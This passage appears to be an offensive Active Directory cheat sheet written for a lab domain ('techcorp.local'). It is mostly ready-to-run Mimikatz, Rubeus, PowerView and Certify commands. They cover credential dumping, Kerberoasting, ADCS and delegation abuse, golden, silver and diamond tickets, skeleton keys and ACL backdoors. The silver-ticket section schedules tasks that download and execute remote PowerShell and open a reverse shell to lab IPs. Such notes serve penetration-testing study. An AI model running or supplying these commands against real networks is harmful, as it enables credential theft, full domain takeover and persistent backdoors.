    dpapi::cred /in:C:\Users\[USERNAME]\AppData\Local\Microsoft\Credentials\1EF01CC92C17C670AC9E57B53C9134F3

    # IF YOU ARE PRIVILEGED
    # Dump all master keys from the current system
    sekurlsa::dpapi

    # IF YOU ARE NOT PRIVILEGED (session as target user required)
    # Get the master key from the domain using RPC (the path contains the user SID, and then the ID of the masterkey identified in the previous step)
    dpapi::masterkey /rpc /in:C:\Users\[USERNAME]\AppData\Roaming\Microsoft\Protect\S-1-5-21-3865823697-1816233505-1834004910-1124\dd89dddf-946b-4a80-9fd3-7f03ebd41ff4

    # Decrypt the secret using the retrieved master key
    # Alternatively, leave out /masterkey and add /unprotect to decrypt the secret using the cached master key (see above for caveats)
    dpapi::cred /in:C:\Users\[USERNAME]]\AppData\Local\Microsoft\Credentials\1EF01CC92C17C670AC9E57B53C9134F3 /masterkey:91721d8b1ec[...]e0f02c3e44deece5f318ad

    ```

## Domain Enumeration

### Domian Details

    ```powershell
    # Get domain details  
    Get-Domain
    Get-Domain -Domain techcorp.local
    Get-DomainSID

    Get-DomainPolicyData
    (Get-DomainPolicyData).systemaccess
    (Get-DomainPolicyData -domain techcorp.local).systemaccess

    Get-DomainController -Domain techcorp.local
    ```

### Domian User, Group and Computer Objects

    ```powershell
    # Domains Users
    Get-DomainUser -Identity studentuser1 -Properties *
    Get-DomainUser -LDAPFilter "Description=*" | Select Name,Description
    Get-DomainUser -TrustedToAuth | Select Name, msds-allowedtodelegateto
    Get-DomainUser -SPN | Select Name, ServicePrincipalName

    # Domain Groups
    Get-DomainGroup -Domain techcorp.local
    Get-DomainGroupMember -Identity "Domain Admins" -Recurse

    # Find group membership of a user
    Get-DomainGroup -UserName studentuser1
    Get-DomainGroup -UserName 'studentuser41' | select distinguishedname
    net user student41 /domain
    whoami /groups

    # Script to find group membership of user recursively 
    function Get-ADPrincipalGroupMembershipRecursive ($SamAccountName) { $groups = @(Get-ADPrincipalGroupMembership -Identity $SamAccountName | select -ExpandProperty distinguishedname) $groups if ($groups.count -gt 0) { foreach ($group in $groups) { Get-ADPrincipalGroupMembershipRecursive $group } } };
    Get-ADPrincipalGroupMembershipRecursive 'studentuserx'

    # Find local group on machine (admin required for non-dc machines)
    Get-NetLocalGroup -ComputerName us-dc

    # Get members of local groups idenitied in prvious steps on a machine
    Get-NetLocalGroupMember -ComputerName us-dc
    Get-NetLocalGroupMember -ComputerName us-dc -GroupName Administrators

    # Domain Computers
    Get-DomainComputer | select Name
    Get-DomainComputer -Unconstrained | select Name
    Get-DomainComputer -TrustedToAuth | select Name, msds-allowedtodelegateto

    # Interesting share
    Get-DomainFileServer
    Get-DomainDFSShare
    Get-NetShare
    Find-DomainShare
    Find-InterestingDomainShareFile
    Get-Childitem -Path C:\ -Force -Include <FILENAME OR WORD TO SEARCH> -Recurse -ErrorAction SilentlyContinue

    # Find Foreign Group Member (ForeignSecurityPrinicpals container as the container is populated only when a principal is added to a domain local security group, and not by adding user as pricipal owner via ACL)
    Find-ForeignGroup -Verbose
    Find-ForeignUser -Verbose
    Get-DomainForeignGroupMember
    Get-DomainForeignGroupMember -Domain <TARGET DOMAIN FQDN>
    ```

### Domain GPO & OU Enumeration

    ```powershell
    # GPO Enumeration
    Get-DomainGPO

    # Enumerate GPOs appliable to a given machine 
    Get-DomainGPO -ComputerIdentity student41.us.techcorp.local | select displayname

    # Find the GPO of RestrictedGroup type for local group membership
    Get-DomainGPOLocalGroup

    # Find the users which are in local group of a machine using GPO
    Get-DomainGPOComputerLocalGroupMapping -ComputerIdentity us-mgmt

    # Find machines where a given user is member of specific group
    Get-DomainGPOUserLocalGroupMapping -Identity studentuser41

    # Get users which are in a local group of a machine in any OU using GPO
    (Get-DomainOU).distinguishedname | %{Get-DomainComputer -SearchBase $_} | Get-DomainGPOComputerLocalGroupMapping

    # Get users which are in a local group of a machine in a particular OU using GPO
    (Get-DomainOU -Identity 'OU=Mgmt,DC=us,DC=techcorp,DC=local').distinguishedname | %{Get-DomainComputer -SearchBase $_} | Get-DomainGPOComputerLocalGroupMapping

    ## Domain Enumeration - OU 

    # Enumerate OU (associated GPO ID is present in GPLINK attribute)
    Get-DomainOU | select displayname, gplink

    # Find GPO applied to given OU by doing lookup of GPO ID identified in previous step
    Get-DomainGPO -Identity '{FCE16496-C744-4E46-AC89-2D01D76EAD68}'

    # Find users which are in local group of computers across all OUs
    (Get-DomainOU).distinguishedname | %{Get-DomainComputer -SearchBase $_ } | Get-DomainGPOComputerLocalGroupMapping

    (Get-DomainOU -Identity 'OU=Mgmt,DC=us,DC=techcorp,DC=local').distinguishedname | %{Get-DomainComputer -SearchBase $_ } | Get-DomainGPOComputerLocalGroupMapping

    ```

### Domain ACL Enumeration

    ```powershell
    # Find ACL associated with any given object
    Get-DomainObjectAcl -Identity Student41
    Get-DomainObjectAcl -Identity Student41 -ResolveGUIDs | select -First 1

    # Find ACL accositaed with given LDAP Path
    Get-DomainObjectAcl -Searchbase "LDAP://CN=Domain Admins,CN=Users,DC=us,DC=techcorp,DC=local" -ResolveGUIDs

    # Find Intresting Domain ACL
    Find-InterestingDomainAcl -ResolveGUIDs | select -First 1
    Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "studentuserx"}

    # Find ACL Associated with PATH, Get the ACLs associated with the specified path

    Get-PathAcl -Path "\\us-dc\sysvol"

    # Enumerate permissions for group
    Invoke-ACLScanner -ResolveGUIDS | Where-Object {$_.IdentityReference -match “<groupname>”}
    Invoke-ACLScanner -ResolveGUIDS | Where-Object {$_.IdentityReference -match “<groupname>”} | select IdentityReference, ObjectDN, ActiveDirectoryRights | fl

    Reference:
    https://github.com/cyberark/ACLight
    ```

### Domain Trust Enumeration

    ```powershell
    # Enumerate the trust for current domain
    Get-DomainTrust
    Get-DomainTrust -Domain Techcorp.local

    # Enumerate Forest Level details
    Get-Forest
    Get-ForestDomain
    Get-ForestGlobalCatalog
    Get-ForestTrust

    # Trust Enumeration using AD Module
    (Get-ADForest).Domains
    Get-ADTrust -Filter *
    ```

### Domain User Hunting

    ```powershell
    ## Domain Enumeration - User Hunting

    # Find the local admin access across all the computers
    Find-localAdminAccess

    # Use WMI and PSRemoting for remote system access
    Find-WMILocalAdminAccess.ps1
    Find-PSRemotingLocalAdminAccess.ps1

    # Find the active session of Domain User/Group 
    Find-DomainUserLocation
    Find-DomainUserLocation -CheckAccess
    Find-DomainUserLocation -UserGroupIdentity "StudentUsers"
    Find-DomainUserLocation -Stealth

    ```

### BloodHound

    ```powershell

    # Enable Sharp-Hound and execute

    . .\SharpHound.ps1
    Invoke-BloodHound -CollectionMethod All,LoggedOn
    Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip

    # Run sharphound collector 
    cd C:\AD\Tools\BloodHound-master\Collectors
    SharpHound.exe --CollectionMethods All

    # Use powershell based collector
    . C:\AD\Tools\BloodHound-master\Collectors\SharpHound.ps1

    # To avoid detections like ATA

    Invoke-BloodHound -CollectionMethods All
    Invoke-BloodHound -CollectionMethod All -ExcludeDC


    #Copy neo4j-community-3.5.1 to C:\
    #Open cmd
    cd C:\neo4j\neo4j-community-3.5.1-windows\bin
    neo4j.bat install-service
    neo4j.bat start

    #Browse to BloodHound-win32-x64 
    Run BloodHound.exe
    #Change credentials and login

    # Start neo4j and BloodHound UI on kali machine and load the zip/json files
    sudo neo4j console&;bloodhound&


    ```

### Privilege Escalation - Local

    ```powershell
    ## Privilege Escalation

    # PrivEsc Tools
    Invoke-PrivEsc (PrivEsc)
    winPEASx64.exe (PEASS-ng)

    # PowerUp
    . C:\AD\Tools\PowerUp.ps1
    Invoke-AllChecks
    Get-SericeUnquoted -Verbose
    Get-ModifiableServiceFile -Verbose
    # List services that can be configured:
    Get-ModifiableService -Verbose

    Invoke-ServiceAbuse -Name "ALG" 
    Invoke-ServiceAbuse -Name ALG -UserName us\studentuserx -Verbose
    Invoke-ServiceAbuse -Name "ALG" -Command "net localgroup Administrators studentuser41 /add"
    Write-ServiceBinary -Name 'VulnerableSvc' -Command 'c:\windows\system32\rundll32 c:\Users\Public\beacon.dll,Update' -Path 'C:\Program Files\VulnerableSvc'

    net localgroup Administrators

    net.exe stop VulnerableSvc
    net.exe start VulnerableSvc

    ```

### Privilege Escalation - Domain

    ```powershell

    >> Privilege Escalation - Kerberosting

    # Keberoasting
    Get-DomainUser -SPN | select cn, serviceprincipalname
    .\Rubeus.exe kerberoast /stats
    .\Rubeus.exe kerberoast /user:serviceaccount /simple /rc4opsec /outfile:hashes.txt

    # Targeted Kerberosting
    Set-DomainObject -Identity support1user -Set @{serviceprincipalname='us/myspn'}

    # Cracking the password
    C:\AD\Tools\john-1.9.0-jumbo-1-win64\run\john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt

    >> Privilege Escalation - gMSA

    - Step 1. Identify the gMSA account by filtering ObjectClass 
    Get-DomainObject -LDAPFilter '(objectClass=msDS-GroupManagedServiceAccount)'

    - Step 2. Identify pricipal having access to the gMSA account via ADModule
    Get-ADServiceAccount -Filter * -Properties name, ObjectClass
    Get-ADServiceAccount -Identity jumpone -Properties * | select PrincipalsAllowedToRetrieveManagedPassword

    - Step 3. Fetch the Password Blob
    $Passwordblob = (Get-ADServiceAccount -Identity jumpone -Properties msDS-ManagedPassword).'msDS-ManagedPassword'

    - Step 4. Convert the password blob to NTLM hash
    Import-Module C:\AD\Tools\DSInternals_v4.7\DSInternals\DSInternals.psd1
    $decodedpwd = ConvertFrom-ADManagedPasswordBlob $Passwordblob
    ConvertTo-NTHash -Password $decodedpwd.SecureCurrentPassword

    - Step 5. Use the passwd hash
    C:\AD\Tools\SafetyKatz.exe "sekurlsa::opassth /user:jumpone /domain:us.techcorp.local /ntlm:0a02c684cc0fa1744195edd1aec43078 /run:cmd.exe" "exit"
    ```

### Local Administrator Password Solution (LAPS)

    ```powershell

    # Check for presence of AdmPwd.dll at below location on the Machine locally
    ls 'C:\Program Files\LAPS\CSE\AdmPwd.dll'

    # Check existance of LAPS in domain
    Get-AdObject 'CN=ms-mcs-admpwd,CN=Schema,CN=Configuration,DC=<DOMAIN>,DC=<DOMAIN>'
    Get-DomainComputer | Where-object -property ms-Mcs-AdmPwdExpirationTime | select-object samaccountname
    Get-DomainGPO -Identity *LAPS*

    # Check to which computers the LAPS GPO is applied to
    Get-DomainOU -GPLink "Distinguishedname from GET-DOMAINGPO -Identity *LAPS*" | select name, distinguishedname
    Get-DomainComputer -Searchbase "LDAP://<distinguishedname>" -Properties Distinguishedname

    # Parse the GPO policy file for LAPS (https://github.com/PowerShell/GPRegistryPolicy))
    Parse-PolFile "<GPCFILESYSPATH FROM GET-DOMAINGPO>\Machine\Registry.pol" | select ValueName, ValueData

    # Fetch the password for given system, if current user has Read/GenericAll access
    Get-DomainObject -Identity us-mailmgmt | select -ExpandProperty ms-mcs-admpwd
    Get-DomainComputer -Identity us-mailmgmt | select name,ms-mcs-admpwd,ms-mcs-admpwdexpirationtime

    # Find users who can read the LAPS password of machine in OU
    Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object { ($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')}

    Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object { ($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_}

    # Using AD module
    . .\Get-lapsPermissions.ps1
    Get-AdmPwdPassword -ComputerName US-MAILMGMT

    # Using LAPS Module
    Import-Module C:\AD\Tools\AdmPwd.PS\AdmPwd.PS.psd1
    Find-AdmPwdExtendedRights -Identity OUDistinguishedName
    Get-AdmPwdPassword -ComputerName US-MAILMGMT

    ```

### Active Directory Certificate Services (ADCS)

    ```powershell

    # Conditions of vulnerable certificate template which can be abused
    - CA grants normal/low privileged users enrollment rights
    - Manager approval is disabled
    - Authorization signatures are not required
    - target template grants normal/low privileged users enrollment rights

    >> Enumerating - Active Directory certificate Service (ADCS) 

    # Identify the ADCS service installation
    Certify.exe cas

    # Enumerate the templates configured
    Certify.exe find

    # Enumerate the vulnerable templates
    Certify.exe find /vulnerable

    # If the enrolleeSuppliesSubject is not not allowed for all domain users, it wont show up in vulnerable template and needs to enumerated seperately (ESC1)
    Certify.exe find /enrolleeSuppliesSubject

    >> Persistance (THEFT-4): Extracting User and Machine certificates

    # List all certificates for local machine in certificate store
    ls cert:\LocalMachine\My

    # Export the certificate in PFX format
    ls cert:\LocalMachine\My\89C1171F6810A6725A47DB8D572537D736D4FF17 | Export-PfxCertificate -FilePath C:\Users\Public\pawadmin.pfx -Password (ConvertTo-SecureString -String 'niks' -Force -AsPlainText)

    # Use Mimikatz to export certificate in pfx format (default cert pass is mimikatz)
    Invoke-mimikatz -Command "crypto::certificates /export"
    Invoke-mimikatz -Command "!crypto::certificates /systemstore:local_machine /export"
    cat cert.pfx | base64 -w 0
    C:\AD\Tools\Rubeus.exe asktgt /user:nlamb /certificate:MNeg[...]IH0A== /password:mimikatz /nowrap /ptt

    >> Escalation (ESC-1) : Domain User to Domain Admin and Enterprise Admin 

    CASE I: Domain Admin

    # Request certificate for DA user using ESC1 technique, and save it as cert.pem
    Certify.exe request /ca:Techcorp-DC.techcorp.local\TECHCORP-DC-CA /template:ForAdminsofPrivilegedAccessWorkstations /altname:Administrator

    # Convert cert.pem to cert.pfx format
    C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\DA.pfx

    # Request TGT using pfx cerificate and inject into memory
    Rubeus.exe asktgt /user:Administrator /certificate:C:\AD\Tools\DA.pfx /password:niks /nowrap /ptt

    CASE II: Enterprise Admin

    # Request certificate for EA user using ESC1 technique
    Certify.exe request /ca:Techcorp-DC.techcorp.local\TECHCORP-DC-CA /template:ForAdminsofPrivilegedAccessWorkstations /altname:Administrator

    # Convert cert.pem to cert.pfx format
    C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\EA.pfx

    # Request TGT using pfx cerificate and inject into memory
    Rubeus.exe asktgt /user:techcorp.local\Administrator
    /dc:techcorp-dc.techcorp.local /certificate:C:\AD\Tools\EA.pfx /password:niks /nowrap /ptt

    ```

### Kerberos Delegation

    ```powershell

    >> Unconstrained Delegation

    # Step 1. Identify Computer Account with Unconstrained Delegation
    Get-DomainComputer -Unconstrained | select samaccountname

    # Step 2. Use PrintSpool attack to force DC$ machine account running print spooler service to authenticate with our Web server having unconstrained delegation enabled. 
    .\MS-RPRN.exe \\us-dc.techcorp.local \\us-web.us.techcorp.local
    .\Petitpotam.exe us-web us-dc

    # Step 3. Login to unconstrained server and execute Rubeus to monitor for ticket
    .\Rubeus.exe monitor /nowrap /targetuser:US-DC$ /interval:5

    # Step 4. Use the Base64 encoded TGT 
    .\Rubeus.exe ptt /ticket:abcd==

    NOTE: Above injected ticket cannot be used directly for code execution but DCSync will work

    # Step 5. DCsync 
    . .\Invoke-Mimi.ps1
    Invoke-Mimi -Command '"lsadump::dcsync /user:us\krbtgt"'
    Invoke-Mimi -Command '"lsadump::dcsync /user:us\Administrator"'
    C:\AD\Tools\SharpKatz.exe --Command dcsync --User techcorp\administrator --Domain techcorp.local --DomainController techcorp-dc.techcorp.local

    >> Constrained Delegation

    - Kerberos Only delegation
    - Protocol Transition for non kerberos service

    # Step 1. Identify a Computer or User account having constrained delegation enabled
    Get-DomainUser -TrustedToAuth | select samaccountname,msds-allowedtodelegateto
    Get-DomainComputer -TrustedToAuth | select samaccountname,msds-allowedtodelegateto

    # Steo 2. Request TGS for Alternate service using the session of affected user
    .\Rubeus.exe s4u /user:appsvc /rc4:1d49d390ac01d568f0ee9be82bb74d4c /impersonateuser:Administrator /msdsspn:"CIFS/us-mssql" /altservice:HTTP /domain:us.techcorp.local /ptt

    # Step 3. Access the service
    winrs -r:us-mssql cmd

    NOTE: Use the same name for remote connection as specified in msdsspn attribute

    >> Resource Based Constrained Delegation (RBCD) attack

    - Requires admin rights on one of domian joined system or ablility to join our computer to domain
    - Write permission on Target System to set msDS-AllowedToActOnBehalfOfOtherIdentity attribute

    CASE I: Using existing Computer for RBCD attack

    STEP 1. Identify the Computer(us-helpdesk) where our principal (mgmtadmin) has GenericAll/Write access 

    ps> Find-InterestingDomainAcl | ?{$_.identityreferencename -match 'mgmtadmin'}

    ps> Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" }

    STEP 2. Set the delegation attribute to a Computer Account where we have local admin access (student41$)

    # Find the SID of Computer Account (student41)
    ps> Get-DomainComputer -Identity student41 -Properties objectSid

    # Login as mgmtadmin user, and Set the delegation attribute to Computer Account (us-helpdesk)
    ps> $rsd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-210670787-2521448726-163245708-16151)"; $rsdb = New-Object byte[] ($rsd.BinaryLength); $rsd.GetBinaryForm($rsdb, 0); Get-DomainComputer -Identity "us-helpdesk" | Set-DomainObject -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity' = $rsdb} -Verbose

    STEP 3. Perform PTH using student41$ computer account

    ps> Rubeus.exe s4u /user:student41$ /rc4:b62c7c107072398d7c81a2639e986b97 /msdsspn:http/us-helpdesk /impersonateuser:administrator /ptt

    STEP 4. Access the system as admin
    winrs -r:us-helpdesk cmd.exe

    CASE II. Creating fake computer account for RBCD attack

    - Every domain user can add machines to Ad based ms-DS-MachineAccountQuota which is set to 10, which will allow us to create fake computer object with known password and add it to domain
    - Write Permission on Target System to set msDS-AllowedToActOnBehalfOfOtherIdentity

    STEP 1. Create a new Machine Account user PowerMad.ps1 script
    ps> . C:\AD\Tools\Powermad.ps1
    ps> New-MachineAccount -MachineAccount studentcompX

    STEP 2. Use above Computer account (created by powermad) instead of student41$ machine account, and rest of the steps stay the same.

    ```

## Kerberos Attacks

### Golden Ticket

1. Get a Powershell session as a "domain admin" using "Over pass the hash" attack
2. Create a New-PSSession attaching to the "domain controller"
3. Enter the new session using Enter-PSSession
4. Bypass the AMSI
5. Exit
6. Load Mimikatz.ps1 on the new session using Invoke-command
7. Enter the new session using Enter-PSSession again
8. Now we can execute mimikatz on the DC
9. Keep note of krbtgt hash
10. Now go to any "non domain admin" account
11. Load Mimikats.ps1
12. Now we can create a ticket using the DC krbtgt hash
13. Now we can access any service on the DC; Example ls \\dc-corp\C$ or
	```PsExec64.exe \\test.local -u Domain\user -p Passw0rd! cmd```



```powershell
# Persistance technique for creating fake TGT ticket using KDC account hash (krbtgt)

# Get Domain Detals
Get-Domain | select name
us.techcorp.local

Get-DomainSID
S-1-5-21-210670787-2521448726-163245708

# Fetch krbtgt ntlm and aes hash
Invoke-Mimi -Command '"lsadump::dcsync /user:krbtgt"'

# Use above details to create a golden ticket impersonating Administrator user
Invoke-Mimi -Command '"kerberos::golden /User:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /krbtgt:b0975ae49f441adc6b024ad238935af5 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'

Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /krbtgt:b0975ae49f441adc6b024ad238935af5 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ticket:golden_tkt.kirbi"'

# Forge the inter-forest TGT
Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:ad.domain.local /sid:<sid> /rc4:<rc4-hash> /service:krbtgt /target:domain2.local /ticket:C:\temp\trust_forest_tkt.kirbi"'

C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /aes256:5e3d2096abb01469a3b0350962b0c65cedbbc611c5eac6f3ef6fc1ffa58cacd5 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"

# Use Golden Ticket to gain RCE on DC
klist
Enter-PSSession -ComputerName us-dc
```

### Silver Ticket

    ```powershell
    # Comman Attack Scenario, if you have TGT of machine account...Then Silver Ticket can b ecrafted to one of the services as CIFS, HOST, HTTP etc and gain RCE on the system

    # Fetch the NTLM hash of the machine account US-DC$
    Invoke-Mimi -Command '"lsadump::dcsync /user:us\US-DC$"'
    f4492105cb24a843356945e45402073e

    # Craft a silver ticket for CIFS service on DC using DC$ machine account NTLM hash
    Invoke-Mimi -Command '"kerberos::golden /User:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /target:us-dc.us.techcorp.local /service:CIFS /rc4:f4492105cb24a843356945e45402073e /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'

    C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /target:us-dc.us.techcorp.local /service:CIFS /aes256:36e55da5048fa45492fc7af6cb08dbbc8ac22d91c697e2b6b9b8c67b9ad1e0bb /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"

    ls \\us-dc.us.techcorp.local\c$

    # Craft HOST service ticket
    Invoke-Mimi -Command '"kerberos::golden /User:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /target:us-dc.us.techcorp.local /service:HOST /rc4:f4492105cb24a843356945e45402073e /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'

    # Use Scheduled task to get RCE on DC via HOST Service
    schtasks /create /S us-dc.us.techcorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck41" /TR "powershell.exe -c 'iex (iwr http://192.168.100.41:8080/dakiya.ps1  -UseBasicParsing); reverse -Reverse -IPAddress 192.168.100.41 -Port 8081'"

    .\nc64.exe -lvp 8081
    powercat -l -v -p 443 -t 1000

    ## Schedule and execute a task

    schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://10.10.10.10:8080/Invoke-PowerShellTcp.psi''')'"

    schtasks /Run /S ad.domain.local /TN "STCheck"

    schtasks /Run /S us-dc.us.techcorp.local /TN "STCheck41"

    NOTE: HOST - Scheduled Task | HOST + RPCSS - PowerShell remoting & WMI | LDAP - DCSync | WSMAN | CIFS

    ```

### Diamond Ticket

    ```powershell
    # Instead of creating completely forged ticket, it fetches valid TGT and modifies required attributes 

    # Request TGT for StudentUserX and modify the parameters to create a diamond ticket
    Rubeus.exe diamond
    /krbkey:5e3d2096abb01469a3b0350962b0c65cedbbc611c5eac6f3ef6fc1ffa58cacd5
    /user:studentuserx /password:studentuserxpassword /enctype:aes
    /ticketuser:administrator /domain:us.techcorp.local /dc:US-DC.us.techcorp.local
    /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show
    /ptt

    # Use /tgtdeleg if we have access as domain user and its TGT is already cached
    Rubeus.exe diamond
    /krbkey:5e3d2096abb01469a3b0350962b0c65cedbbc611c5eac6f3ef6fc1ffa58cacd5
    /tgtdeleg /enctype:aes /ticketuser:administrator /domain:us.techcorp.local
    /dc:US-DC.us.techcorp.local /ticketuserid:500 /groups:512
    /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
    ```

### Skeleton Key

    ```powershell
    # Once set, Allows any user to Login using 'mimikatz' as password for any useraccount
    ## Use the below command to inject a skeleton-Key
    ## Skeleton Key password is : mimikatz
    Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName us-dc
    Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton' -ComputerName dcorp-dc.dollarcorp.moneycorp.local

    # If lsass is running as protected process
    ## In case Lsass is running as a protected process, we can still use Skeleton Key but it needs the mimikatz driver (mimidriv.sys) on disk of the target DC


    mimikatz # privilege::debug
    mimikatz # !+
    mimikatz # !processprotect /process:lsass.exe /remove
    mimikatz # misc::skeleton
    mimikatz # !-
    ```

### DSRM Account

    ```powershell
    # Directory Services Restore Mode (DSRM), is the local Administrator whose password is configured as SafeModePassword. it is stored in SAM file and not ntds.dat file 

    # Dump the local account credentials from sam file (having local DSRM account) 
    Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -Computer us-dc

    # Adminsitrator hash for DA stored in ntds.dat file can be fetched using below command
    Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername us-dc

    # Login is not allowed by DSRM Account, requires regitry changes
    New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DsrmAdminLogonBehaviour" -Value 2 -PropertyType DWORD

    # Login using PTH
    Invoke-Mimikatz -Command '"sekurlsa::pth /domain:us-dc /user:Administrator /ntlm:acxs /run"powershell.exe"'

    ls \\us-dc\c$
    Enter-PSSession -ComputerName us-dc -Authentication Negotiate
    ```

### Custom SSP

    ```powershell
    # Custom SSP, once injected in the lsass memory would log the username and password in clear text  
    Invoke-Mimikatz -Command '"misc::memssp"'

    # Logs are stored to
    C:\Windows\system32\kiwissp.log
    ```

### Admin SDHolder

    ```powershell
    # Resides in System Container of domain and maintains permission for Protected Groups
    # Uses Security Descriptor Propagator (SDPROP) every hour and compares the ACL of protected groups & its members with ACL defined in AdminSDHolder and any differences are overwritten

    # Set generic all rights to our specified principal 
    Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc=us,dc=techcorp,dc=local' -PrincipalIdentity studentuser1 -Right All -PrincipalDomain us.techcorp.local -TargetDomain us.techcorp.local -verbose

    # Other interesting permissions include (ResetPassword, WriteMembers)

    # Trigger the SDPropagation
    Invoke-SDPropagator -timeoutMinutes 1 -showProgress -verbose

    ```

### ACL Abuse Scenarios

    ```powershell

    >> CASE 1: Modify right on Domain Admins group

    # Step 1. Check if one of the pricipals we control has any rights on Domain Admin group
    Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs | ?{$_.IdentityReferenceName -match "studentuserSID"}

    # Stp 2.  Above Privilege can be abused by adding members to Domain Admin Group
    Add-DomainGroupMember -Identity 'Domain Admins' -Members testda -Verbose

    >> CASE 2: Exploiting ResetPassword rights on Domain User Account

    # Step 1. Change Password of user account if there is any resetpassword rights using powerview
    Set-DomainUserPassword -Identity testda -AccountPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -verbose

    >> CASE 3: DCSync rights on user account

    # CASE 3.1: Check for presence of DCSync Right to any pricipal in domain
    Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.ObjectAceType -match 'repl' -and $_.SecurityIdentifier -match 'S-1-5-21-210670787-2521448726-163245708'}  | select ObjectDN,  ObjectAceType, SecurityIdentifier

    Get-DomainObjectAcl -SearchBase "dc=us,dc=techcorp,dc=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "studentuserx"}

    # Case 3.2: Assign full rights or DCSync on the domain where we have modify right on user account
    Add-DomainObjectAcl -TargetIdentity "dc=us,dc=techcorp,dc=local" -PrincipalIdentity studentuser1 -Right All -PrincipalDomain us.techcorp.local -TargetDomain us.techcorp.local -verbose

    Add-DomainObjectAcl -TargetIdentity "dc=us,dc=techcorp,dc=local" -PrincipalIdentity studentuser1 -Right DCSync -PrincipalDomain us.techcorp.local -TargetDomain us.techcorp.local -verbose

    >> CASE 4: If there is Generic Write attribute available on Computer Object, then we can use 'RBCD' attack
    >> CASE 5: If there is WriteProperty on User Account, the we can inject 'Shadow credentials' using whishker

    >> CASE 6: Enable kerberosting, ASEPRoasting and Delegation if we have write access to user account
    Set-DomainObject -Identity devuser -Set @{serviceprincipalname ='dev/svc'
    Set-DomainObject -Identity devuser -Set @{"msds-allowedtodelegatetoallowedtodelegateto"="ldap/us-dc.us.techcorp.local"}
    Set-DomainObject -SamAccountName devuser1 -Xor @{"useraccountcontrol"="16777216"}

    ```

### ACL - Security Descriptors

    ```powershell
    # Assign remote access to non-admin user by modifying the ACL for remote access services as WMI and PSRemoting on specific host. The Security Descriptor in ACLs is made of below syntax:
    # ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid
    # A;CI;CCDCLCSWRPWPRCWD;;;SID

    - RACE Toolkit can be used for abuse ACL and apply a backdoor for non-admin user access

    # Load RACE toolkit
    . C:\AD\Tools\RACE\master\RACE.ps1

    # Set backdoor on loal system or specified system (WMI and Powershell)
    Set-RemoteWMI -SamAccountName studentuser1 -Verbose
    Set-RemoteWMI -SamAccountName studentuser1 -ComputerName US-DC -Verbose
    Set-RemoteWMI -SamAccountName studentuser1 -ComputerName us-dc -Credential Administrator -namespace 'root\cimv2' Verbose

    Set-RemotePSRemoting -SamAccountName studentuser1 -Verbose
    Set-RemotePSRemoting -SamAccountName studentuser1 -ComputerName us-dc Verbose

    # Remove the permission
    Set-RemoteWMI -SamAccountName studentuser1 -ComputerName us-dc -Remove
    Set-RemotePSRemoting -SamAccountName studentuser1 -ComputerName us-dc -Remove

